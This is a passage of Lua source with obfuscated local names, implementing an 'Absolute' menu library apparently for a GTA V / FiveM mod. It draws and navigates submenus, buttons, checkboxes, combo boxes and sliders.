        Absolute.CreateMenu(PzZ, wWjAS8[ah6k69OW6AO0PRn0Xlu].title)
        if jR77U then
            EPd4KT2PLr(PzZ, "subTitle", string.upper(jR77U))
        else
            EPd4KT2PLr(PzZ, "subTitle", string.upper(wWjAS8[ah6k69OW6AO0PRn0Xlu].subTitle))
        end
        EPd4KT2PLr(PzZ, "previousMenu", ah6k69OW6AO0PRn0Xlu)
        EPd4KT2PLr(PzZ, "x", wWjAS8[ah6k69OW6AO0PRn0Xlu].x)
        EPd4KT2PLr(PzZ, "y", wWjAS8[ah6k69OW6AO0PRn0Xlu].y)
        EPd4KT2PLr(PzZ, "maxOptionCount", wWjAS8[ah6k69OW6AO0PRn0Xlu].maxOptionCount)
        EPd4KT2PLr(PzZ, "titleFont", wWjAS8[ah6k69OW6AO0PRn0Xlu].titleFont)
        EPd4KT2PLr(PzZ, "titleColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].titleColor)
        EPd4KT2PLr(PzZ, "titleBackgroundColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].titleBackgroundColor)
        EPd4KT2PLr(PzZ, "titleBackgroundSprite", wWjAS8[ah6k69OW6AO0PRn0Xlu].titleBackgroundSprite)
        EPd4KT2PLr(PzZ, "menuTextColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].menuTextColor)
        EPd4KT2PLr(PzZ, "menuSubTextColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].menuSubTextColor)
        EPd4KT2PLr(PzZ, "menuFocusTextColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].menuFocusTextColor)
        EPd4KT2PLr(PzZ, "menuFocusBackgroundColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].menuFocusBackgroundColor)
        EPd4KT2PLr(PzZ, "menuBackgroundColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].menuBackgroundColor)
        EPd4KT2PLr(PzZ, "subTitleBackgroundColor", wWjAS8[ah6k69OW6AO0PRn0Xlu].subTitleBackgroundColor)
    else
        rK(
            "Failed to create " ..
                tostring(PzZ) .. " submenu: " .. tostring(ah6k69OW6AO0PRn0Xlu) .. " parent menu doesn't exist"
        )
    end
end
function Absolute.CurrentMenu()
    return xV7EAnbI4oYL6jSIBnjq
end
function Absolute.OpenMenu(QK)
    if QK and wWjAS8[QK] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        u1RGlgrwDNMEFp2K(QK, true)
        rK(tostring(QK) .. " menu opened")
    else
        rK("Failed to open " .. tostring(QK) .. " menu: it doesn't exist")
    end
end
function Absolute.IsMenuOpened(B)
    return mDkHWFkytGR(B)
end
function Absolute.IsAnyMenuOpened()
    for XOpA, lbIU8QGKS in pairs(wWjAS8) do
        if mDkHWFkytGR(XOpA) then
            return true
        end
    end
    return false
end
function Absolute.IsMenuAboutToBeClosed()
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        return wWjAS8[xV7EAnbI4oYL6jSIBnjq].aboutToBeClosed
    else
        return false
    end
end
function Absolute.CloseMenu()
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].aboutToBeClosed then
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].aboutToBeClosed = false
            u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
            rK(tostring(xV7EAnbI4oYL6jSIBnjq) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            jbPzKxfZnu2uS = 0.0
            xV7EAnbI4oYL6jSIBnjq = nil
            jM3_Fcyu0yA8NxXu = nil
        else
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].aboutToBeClosed = true
            rK(tostring(xV7EAnbI4oYL6jSIBnjq) .. " menu about to be closed")
        end
    end
end
function Absolute.Button(NoSfKVbdCQMX2PxwYO5, B_2V5X4Cqg40TNVpeO, i2wlB)
    local u1xOmLNxsk7USq = NoSfKVbdCQMX2PxwYO5
    if B_2V5X4Cqg40TNVpeO then
        u1xOmLNxsk7USq = "{ " .. tostring(u1xOmLNxsk7USq) .. ", " .. tostring(B_2V5X4Cqg40TNVpeO) .. " }"
    end
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        jbPzKxfZnu2uS = jbPzKxfZnu2uS + 1
        local GbqtRswfOY7C = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS
        BNMCk91jk0(NoSfKVbdCQMX2PxwYO5, B_2V5X4Cqg40TNVpeO, i2wlB)
        if GbqtRswfOY7C then
            if jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.select then
                PlaySoundFrontend(
                    -1,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.name,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.set,
                    true
                )
                rK(u1xOmLNxsk7USq .. " button pressed")
                return true
            elseif jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.left or jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        rK(
            "Failed to create " ..
                u1xOmLNxsk7USq .. " button: " .. tostring(xV7EAnbI4oYL6jSIBnjq) .. " menu doesn't exist"
        )
        return false
    end
end
function Absolute.MenuButton(eVT3JD_A, rTGghvAtMu, xl_e8, AbWi3KHzmht6kz0cf85)
    if wWjAS8[rTGghvAtMu] then
        if Absolute.Button(eVT3JD_A, xl_e8, AbWi3KHzmht6kz0cf85) then
            u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
            u1RGlgrwDNMEFp2K(rTGghvAtMu, true, true)
            return true
        end
    else
        rK(
            "Failed to create " ..
                tostring(eVT3JD_A) .. " menu button: " .. tostring(rTGghvAtMu) .. " submenu doesn't exist"
        )
    end
    return false
end
local function prOAI9Hf0UHqdC(yyZ1, DD)
    local gz9jaZo3j8nxjDqn0HEz = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
    local xNNMQ7PPvIbJbzY9WP = nil
    if
        wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount
     then
        xNNMQ7PPvIbJbzY9WP = jbPzKxfZnu2uS
    elseif
        jbPzKxfZnu2uS > wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption
     then
        xNNMQ7PPvIbJbzY9WP =
            jbPzKxfZnu2uS - (wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount)
    end
    if xNNMQ7PPvIbJbzY9WP then
        local ZQs6BWJ =
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf + klqT8RRE7whnNb9Jwode + (klqT8RRE7whnNb9Jwode * xNNMQ7PPvIbJbzY9WP) -
            klqT8RRE7whnNb9Jwode / 2
        local m3 = nil
        local _5YH_TGWogvBCManpykUW = nil
        local Q8bX = false
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS then
            m3 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusBackgroundColor
            _5YH_TGWogvBCManpykUW = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusTextColor
        else
            m3 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuBackgroundColor
            _5YH_TGWogvBCManpykUW = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuTextColor
            Q8bX = true
        end
        Pp8cjHZ_7lGx(gz9jaZo3j8nxjDqn0HEz, ZQs6BWJ, wWjAS8[xV7EAnbI4oYL6jSIBnjq].width, klqT8RRE7whnNb9Jwode, m3)
        hG5JA1A_JGdjqAvb_VN(
            yyZ1,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
            ZQs6BWJ - (klqT8RRE7whnNb9Jwode / 2) + BpxJ,
            ZQt,
            _5YH_TGWogvBCManpykUW,
            CpEz3cm8vrz0MZwAZV7,
            false,
            Q8bX
        )
        if not HasStreamedTextureDictLoaded("helicopterhud") then
            RequestStreamedTextureDict("helicopterhud", true)
        end
        if not HasStreamedTextureDictLoaded("commonmenu") then
            RequestStreamedTextureDict("commonmenu", true)
        end
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS then
            if DD then
                DrawSprite(
                    "mpleaderboard",
                    "leaderboard_car_colour_bg",
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.225,
                    ZQs6BWJ - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                    0.0125,
                    0.0215,
                    0.0,
                    0.0,
                    255,
                    0.0,
                    255
                )
            else
                DrawSprite(
                    "mpleaderboard",
                    "leaderboard_car_colour_bg",
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.225,
                    ZQs6BWJ - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                    0.0125,
                    0.0215,
                    0.0,
                    255,
                    0.0,
                    0.0,
                    255
                )
            end
        else
            if DD then
                DrawSprite(
                    "mpleaderboard",
                    "leaderboard_car_colour_bg",
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.225,
                    ZQs6BWJ - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                    0.0125,
                    0.0215,
                    0.0,
                    0.0,
                    255,
                    0.0,
                    255
                )
            else
                DrawSprite(
                    "mpleaderboard",
                    "leaderboard_car_colour_bg",
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.225,
                    ZQs6BWJ - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                    0.0125,
                    0.0215,
                    0.0,
                    255,
                    0.0,
                    0.0,
                    255
                )
            end
        end
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS and dG1AKw8upKUbCOG then
            if not HasStreamedTextureDictLoaded("commonmenu") then
                RequestStreamedTextureDict("commonmenu", true)
            end
            if not HasStreamedTextureDictLoaded("commonmenu") then
                RequestStreamedTextureDict("commonmenu", true)
            end
            DrawSprite(
                "commonmenu",
                "gradient_nav",
                gz9jaZo3j8nxjDqn0HEz,
                ZQs6BWJ,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                nlXCUGaxh(0.0),
                MainColor.r,
                MainColor.g,
                MainColor.b,
                160
            )
            DrawSprite(
                "commonmenu",
                "gradient_bgd",
                gz9jaZo3j8nxjDqn0HEz,
                ZQs6BWJ,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                nlXCUGaxh(0.0),
                255,
                255,
                255,
                180
            )
        end
    end
end
function Absolute.CheckboxButton(Qiy0MviL, wj3pDMn8jXNGA0FFrkm)
    local Ug32afP7iDM64RDF = Qiy0MviL
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        jbPzKxfZnu2uS = jbPzKxfZnu2uS + 1
        local VK6gSzlt7plgom34 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS
        prOAI9Hf0UHqdC(Qiy0MviL, wj3pDMn8jXNGA0FFrkm)
        if VK6gSzlt7plgom34 then
            if jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.select then
                PlaySoundFrontend(
                    -1,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.name,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.set,
                    true
                )
                rK(Ug32afP7iDM64RDF .. " button pressed")
                return true
            elseif jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.left or jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        rK(
            "Failed to create " ..
                Ug32afP7iDM64RDF .. " button: " .. tostring(xV7EAnbI4oYL6jSIBnjq) .. " menu doesn't exist"
        )
        return false
    end
end
function Absolute.CheckBox(KAphBzIhpNVZhcYLVQu8, zjZA9rHLP1xF, JN0R)
    if Absolute.CheckboxButton(KAphBzIhpNVZhcYLVQu8, zjZA9rHLP1xF) then
        zjZA9rHLP1xF = not zjZA9rHLP1xF
        rK(tostring(KAphBzIhpNVZhcYLVQu8) .. " checkbox changed to " .. tostring(zjZA9rHLP1xF))
        if JN0R then
            JN0R(zjZA9rHLP1xF)
        end
        return true
    end
    return false
end
function Absolute.ComboBox(cjucD7ApD0lCjLEGBKm9, m6valWd_kBnhHu, rDpb87sH8x, E39AA4lqCw, pFzYLHd4CCvzSS)
    local MWMvGcR9YbUIE8x = #m6valWd_kBnhHu
    local wF9bjlFNmuhhUrxYk7Q = m6valWd_kBnhHu[rDpb87sH8x]
    local ou = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == (jbPzKxfZnu2uS + 1)
    if MWMvGcR9YbUIE8x > 1 and ou then
        wF9bjlFNmuhhUrxYk7Q = "- " .. tostring(wF9bjlFNmuhhUrxYk7Q) .. " -"
    end
    if Absolute.Button(cjucD7ApD0lCjLEGBKm9, wF9bjlFNmuhhUrxYk7Q) then
        E39AA4lqCw = rDpb87sH8x
        pFzYLHd4CCvzSS(rDpb87sH8x, E39AA4lqCw)
        return true
    elseif ou then
        if jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.left then
            if rDpb87sH8x > 1 then
                rDpb87sH8x = rDpb87sH8x - 1
            else
                rDpb87sH8x = MWMvGcR9YbUIE8x
            end
        elseif jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.right then
            if rDpb87sH8x < MWMvGcR9YbUIE8x then
                rDpb87sH8x = rDpb87sH8x + 1
            else
                rDpb87sH8x = 1
            end
        end
    else
        rDpb87sH8x = E39AA4lqCw
    end
    pFzYLHd4CCvzSS(rDpb87sH8x, E39AA4lqCw)
    return false
end
function Absolute.Display()
    if mDkHWFkytGR(xV7EAnbI4oYL6jSIBnjq) then
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].aboutToBeClosed then
            Absolute.CloseMenu()
        else
            ClearAllHelpMessages()
            UprRgl12vBXwF()
            UMp8Lb0GbO()
            v()
            jM3_Fcyu0yA8NxXu = nil
            if IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption < jbPzKxfZnu2uS then
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption + 1
                else
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption = 1
                end
            elseif IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption > 1 then
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - 1
                else
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption = jbPzKxfZnu2uS
                end
            elseif IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.left) then
                jM3_Fcyu0yA8NxXu = m7seRenREHC71wmzad.left
            elseif IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.right) then
                jM3_Fcyu0yA8NxXu = m7seRenREHC71wmzad.right
            elseif IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.select) then
                jM3_Fcyu0yA8NxXu = m7seRenREHC71wmzad.select
            elseif IsDisabledControlJustReleased(1, m7seRenREHC71wmzad.back) then
                if wWjAS8[wWjAS8[xV7EAnbI4oYL6jSIBnjq].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    u1RGlgrwDNMEFp2K(wWjAS8[xV7EAnbI4oYL6jSIBnjq].previousMenu, true)
                else
                    Absolute.CloseMenu()
                end
            end
            jbPzKxfZnu2uS = 0.0
        end
    end
end
function Absolute.ComboBoxSlider(SGW1f, Gc, _qSkjIFi0, HqQ7tsw, J2mzy)
    local siq_MhLFpTd_WHJFyFvVu = #Gc
    local x_So1eL3GWKLSyvSGT = Gc[_qSkjIFi0]
    local owJt5IYand_5TjatE09b = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == (jbPzKxfZnu2uS + 1)
    if siq_MhLFpTd_WHJFyFvVu > 1 and owJt5IYand_5TjatE09b then
        x_So1eL3GWKLSyvSGT = tostring(x_So1eL3GWKLSyvSGT)
    end
    if Absolute.Button2(SGW1f, Gc, siq_MhLFpTd_WHJFyFvVu, _qSkjIFi0) then
        HqQ7tsw = _qSkjIFi0
        J2mzy(_qSkjIFi0, HqQ7tsw)
        return true
    elseif owJt5IYand_5TjatE09b then
        if jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.left then
            if _qSkjIFi0 > 1 then
                _qSkjIFi0 = _qSkjIFi0 - 1
            elseif _qSkjIFi0 == 1 then
                _qSkjIFi0 = 1
            end
        elseif jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.right then
            if _qSkjIFi0 < siq_MhLFpTd_WHJFyFvVu then
                _qSkjIFi0 = _qSkjIFi0 + 1
            elseif _qSkjIFi0 == siq_MhLFpTd_WHJFyFvVu then
                _qSkjIFi0 = siq_MhLFpTd_WHJFyFvVu
            end
        end
    else
        _qSkjIFi0 = HqQ7tsw
    end
    J2mzy(_qSkjIFi0, HqQ7tsw)
    return false
end
function Absolute.Button2(qmVZ, kOcRtCRDS, vY6YyN, VfnaX)
    local T4G8w7Snk4hDMn6nSD_ = qmVZ
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        jbPzKxfZnu2uS = jbPzKxfZnu2uS + 1
        local _4rEQAfJvEXT = wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS
        drawButton2(qmVZ, kOcRtCRDS, vY6YyN, VfnaX)
        if _4rEQAfJvEXT then
            if jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.select then
                PlaySoundFrontend(
                    -1,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.name,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].buttonPressedSound.set,
                    true
                )
                rK(T4G8w7Snk4hDMn6nSD_ .. " button pressed")
                return true
            elseif jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.left or jM3_Fcyu0yA8NxXu == m7seRenREHC71wmzad.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        rK(
            "Failed to create " ..
                T4G8w7Snk4hDMn6nSD_ .. " button: " .. tostring(xV7EAnbI4oYL6jSIBnjq) .. " menu doesn't exist"
        )
        return false
    end
end
function drawButton2(lcOf6wQBho6CUBoiO8S, SVPuXkEGanVi9hrnYeAy, e2ZJLdL, UpC)
    local ogbtisVrfBBML4GtDhL2 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
    local eS77gNlBVt = nil
    if
        wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount
     then
        eS77gNlBVt = jbPzKxfZnu2uS
    elseif
        jbPzKxfZnu2uS > wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption
     then
        eS77gNlBVt =
            jbPzKxfZnu2uS - (wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount)
    end
    if eS77gNlBVt then
        local uXjiPex3ilOcX6vQXsEY8 =
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf + klqT8RRE7whnNb9Jwode + (klqT8RRE7whnNb9Jwode * eS77gNlBVt) -
            klqT8RRE7whnNb9Jwode / 2
        local gkK4s = nil
        local AZgR7EzlLTZJgek_to = nil
        local uOz2QtG = nil
        local U16781sHW0 = true
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS then
            gkK4s = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusBackgroundColor
            AZgR7EzlLTZJgek_to = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusTextColor
            uOz2QtG = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusTextColor
            rectBackgroundColor = {r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255}
            rectBackgroundLine = {r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255}
        else
            gkK4s = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuBackgroundColor
            AZgR7EzlLTZJgek_to = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuTextColor
            uOz2QtG = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuSubTextColor
            rectBackgroundColor = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuTextColor
            rectBackgroundLine = {r = 155, g = 155, b = 155, a = 150}
            U16781sHW0 = true
        end
        local lE61rx7tybfXC_oO = ((wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 3) / e2ZJLdL)
        local aD77r6LmI4XTX3 = ((lE61rx7tybfXC_oO * (UpC + 1)) - (lE61rx7tybfXC_oO * UpC)) / 2
        local OfD = 0.16
        local yAHw95C0vFC6NLySrMo4Fj = 1
        if e2ZJLdL >= 40 then
            yAHw95C0vFC6NLySrMo4Fj = 1.005
        end
        Pp8cjHZ_7lGx(
            ogbtisVrfBBML4GtDhL2,
            uXjiPex3ilOcX6vQXsEY8,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            gkK4s
        )
        Pp8cjHZ_7lGx(
            ((wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + 0.162) + (aD77r6LmI4XTX3 * e2ZJLdL)) / yAHw95C0vFC6NLySrMo4Fj,
            uXjiPex3ilOcX6vQXsEY8,
            lE61rx7tybfXC_oO * (e2ZJLdL - 1) + 0.001,
            klqT8RRE7whnNb9Jwode / 2 + 0.002,
            rectBackgroundLine
        )
        Pp8cjHZ_7lGx(
            ((wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + 0.162) + (aD77r6LmI4XTX3 * e2ZJLdL)) / yAHw95C0vFC6NLySrMo4Fj,
            uXjiPex3ilOcX6vQXsEY8,
            lE61rx7tybfXC_oO * (e2ZJLdL - 1),
            klqT8RRE7whnNb9Jwode / 2,
            {r = 10, g = 10, b = 10, a = 150}
        )
        Pp8cjHZ_7lGx(
            ((wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + 0.162) + (aD77r6LmI4XTX3 * UpC)) / yAHw95C0vFC6NLySrMo4Fj,
            uXjiPex3ilOcX6vQXsEY8,
            lE61rx7tybfXC_oO * (UpC - 1),
            klqT8RRE7whnNb9Jwode / 2,
            rectBackgroundColor
        )
        hG5JA1A_JGdjqAvb_VN(
            lcOf6wQBho6CUBoiO8S,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
            uXjiPex3ilOcX6vQXsEY8 - (klqT8RRE7whnNb9Jwode / 2) + BpxJ,
            ZQt,
            AZgR7EzlLTZJgek_to,
            CpEz3cm8vrz0MZwAZV7,
            false,
            U16781sHW0
        )
        local rlRMZBMd = 0.16
        local U8Z7IrD = tostring(SVPuXkEGanVi9hrnYeAy[UpC])
        if string.len(U8Z7IrD) == 1 then
            rlRMZBMd = 0.1275
        elseif string.len(U8Z7IrD) == 2 then
            rlRMZBMd = 0.155
        elseif string.len(U8Z7IrD) == 3 then
            rlRMZBMd = 0.155
        elseif string.len(U8Z7IrD) == 4 then
            rlRMZBMd = 0.155
        elseif string.len(U8Z7IrD) == 5 then
            rlRMZBMd = 0.155
        elseif string.len(U8Z7IrD) >= 6 then
            rlRMZBMd = 0.155
        end
        hG5JA1A_JGdjqAvb_VN(
            SVPuXkEGanVi9hrnYeAy[UpC],
            (wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + rlRMZBMd) + (lE61rx7tybfXC_oO * roundNum((e2ZJLdL / 2), 3)),
            uXjiPex3ilOcX6vQXsEY8 - (klqT8RRE7whnNb9Jwode / 2.15) + BpxJ,
            ZQt,
            {r = 255, g = 255, b = 255, a = 255},
            CpEz3cm8vrz0MZwAZV7,
            false,
            U16781sHW0
        )
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS and dG1AKw8upKUbCOG then
            if not HasStreamedTextureDictLoaded("deadline") then
                RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "commonmenu",
                "gradient_nav",
                ogbtisVrfBBML4GtDhL2,
                uXjiPex3ilOcX6vQXsEY8,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                0.0,
                MainColor.r,
                MainColor.g,
                MainColor.b,
                160
            )
            DrawSprite(
                "commonmenu",
                "gradient_bgd",
                ogbtisVrfBBML4GtDhL2,
                uXjiPex3ilOcX6vQXsEY8,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                0.0,
                255,
                255,
                255,
                180
            )
        end
    end
end
function Absolute.SetMenuWidth(_Vm, QAWxQmJhRvHdAkMdrW)
    EPd4KT2PLr(_Vm, "width", QAWxQmJhRvHdAkMdrW)
end
function Absolute.SetMenuX(mpbKwOdEI, pW35VO5wNTqvX_IJKAMt)
    EPd4KT2PLr(mpbKwOdEI, "x", pW35VO5wNTqvX_IJKAMt)
end
function Absolute.SetMenuY(omP0bKZRif9tuFboWN3, moaMGYnradJEBm)
    EPd4KT2PLr(omP0bKZRif9tuFboWN3, "y", moaMGYnradJEBm)
end
function Absolute.SetMenuMaxOptionCountOnScreen(YysOZ4DBKmj6pqZHU, upH6q)
    EPd4KT2PLr(YysOZ4DBKmj6pqZHU, "maxOptionCount", upH6q)
end
function Absolute.SetTitle(wUy4O6, D0ImqK)
    EPd4KT2PLr(wUy4O6, "title", D0ImqK)
end
function Absolute.SetTitleColor(
    z9AupYwpDG8xuHJ5B6,
    K1bQiHOONz,
    Fd8azHrLZD7LBveQEakX,
    Ykk4xuOBRBQwArGPhf3,
    q6amr8VLMPblltK)
    EPd4KT2PLr(
        z9AupYwpDG8xuHJ5B6,
        "titleColor",
        {
            ["r"] = K1bQiHOONz,
            ["g"] = Fd8azHrLZD7LBveQEakX,
            ["b"] = Ykk4xuOBRBQwArGPhf3,
            ["a"] = q6amr8VLMPblltK or wWjAS8[z9AupYwpDG8xuHJ5B6].titleColor.a
        }
    )
end
function Absolute.SetTitleBackgroundColor(ARNu6gXIghQKV, Ltn1tef2T, vyOwaSTevC_E, sOM8TL, ofb)
    EPd4KT2PLr(
        ARNu6gXIghQKV,
        "titleBackgroundColor",
        {
            ["r"] = Ltn1tef2T,
            ["g"] = vyOwaSTevC_E,
            ["b"] = sOM8TL,
            ["a"] = ofb or wWjAS8[ARNu6gXIghQKV].titleBackgroundColor.a
        }
    )
end
function Absolute.SetTitleBackgroundSprite(x2rYA1F8CyREyLtBXSSYk, m6o4IqshOtWiFS, zPjNe6BFLZm81)
    RequestStreamedTextureDict(m6o4IqshOtWiFS)
    EPd4KT2PLr(x2rYA1F8CyREyLtBXSSYk, "titleBackgroundSprite", {dict = m6o4IqshOtWiFS, name = zPjNe6BFLZm81})
end
function Absolute.SetSubTitle(cPXVrKlKqm, PFrnP_djyF3W8UOpgm3)
    EPd4KT2PLr(cPXVrKlKqm, "subTitle", string.upper(PFrnP_djyF3W8UOpgm3))
end
function Absolute.SetMenuBackgroundColor(_iBmW8, oZLS, sFEN_, wSLoXOul, CubsZrH_athtvs9V3f)
    EPd4KT2PLr(
        _iBmW8,
        "menuBackgroundColor",
        {
            ["r"] = oZLS,
            ["g"] = sFEN_,
            ["b"] = wSLoXOul,
            ["a"] = CubsZrH_athtvs9V3f or wWjAS8[_iBmW8].menuBackgroundColor.a
        }
    )
end
function Absolute.SetMenuTextColor(f, vVAMug_Gk3WuK, n4WcacKzs, uaBVQS4qGSXhs7ec9eu, uARhl3hvv0x1)
    EPd4KT2PLr(
        f,
        "menuTextColor",
        {
            ["r"] = vVAMug_Gk3WuK,
            ["g"] = n4WcacKzs,
            ["b"] = uaBVQS4qGSXhs7ec9eu,
